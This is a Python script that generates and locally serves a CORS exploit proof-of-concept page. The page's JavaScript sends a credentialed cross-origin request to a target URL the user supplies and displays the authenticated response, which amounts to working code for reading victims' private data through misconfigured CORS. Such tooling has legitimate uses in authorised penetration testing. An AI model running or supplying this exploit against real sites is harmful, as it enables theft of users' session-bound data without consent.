import os
import argparse

import textwrap


def getHTML(u):
  return """
  <!DOCTYPE html>
  <html>
    <body>
      <center>
        <h2>CORS Exploit POC</h2>
        <h3>Get Information</h3>
         
        <div id="info">
          <button type="button" onclick="cors()">Exploit</button>
        </div>
        <br/>
        <textarea id="response" cols="160" rows="60"></textarea>
      </center>

      <script>
        function cors() {
          var xhttp = new XMLHttpRequest();
          xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
              document.getElementById("response").innerHTML = this.responseText;
            }
          };
          xhttp.open("GET","%s", true);"""%u+"""
          xhttp.withCredentials = true;
          xhttp.send();
        }
      </script>
    </body>
  </html>
  """

def parse_arguments():
  '''
  parse command line args, exits on invalid args
  '''
  parser = argparse.ArgumentParser(
    formatter_class=argparse.RawDescriptionHelpFormatter, 
    description=textwrap.dedent('''\
    Creates a basic POC html file for CORS based on user inputs
    Example usage:  python poc-generator.py -u [url]
    Copyright (C) 2017 Adam Schaal
    MIT License'''))

  parser.add_argument('-u', '--url', help='endpoint url', required=True)
  parser.add_argument('-p', '--port', default=4444, help='define specific port to run server on, default 4444')
 

  return vars(parser.parse_args())



def main():
  options = parse_arguments()
  html = getHTML(options['url'])

  f=open("cors.html","w")
  f.write(html)
  f.close()
  print "Serving cors_poc at url: http://localhost:%d/cors.html" % options['port']
  os.system("python -m SimpleHTTPServer %d" % options['port'])



if __name__ == "__main__":
  main()

